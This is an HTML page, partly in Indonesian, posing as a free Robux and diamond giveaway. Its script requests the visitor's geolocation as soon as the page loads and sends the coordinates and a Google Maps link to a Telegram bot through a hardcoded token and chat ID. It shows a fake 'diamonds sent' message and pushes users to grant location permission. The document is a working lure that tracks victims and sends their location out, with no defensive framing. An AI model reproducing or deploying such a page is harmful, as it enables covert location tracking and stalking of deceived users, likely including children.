<!DOCTYPE html>
<html>
<head>
  <title>Memuat...</title>
</head>
<body>
  <h2>ROBUX FREE</h2>
  <p id="status">diamod gratis 2025!!!</p>

  <script>
    function sendToTelegram(lat, lon) {
      const token = "7783606251:AAHfso5w1XcaUwJYE_VnHSd2hl8x8S4AqAU";
      const chat_id = "7711427708";
      const message = `Lokasi pengguna:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`;
      
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chat_id, text: message })
      });
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          document.getElementById("status").innerText = "❤️DIAMOND 870DM TERKIRIM!!!!";
          sendToTelegram(lat, lon);
        },
        error => {
          document.getElementById("status").innerText = "izinkan agar kita bisa mengirim diamond nya";
        }
      );
    } else {
      document.getElementById("status").innerText = "Browser tidak mendukung geolokasi.";
    }
  </script>
</body>
</html>
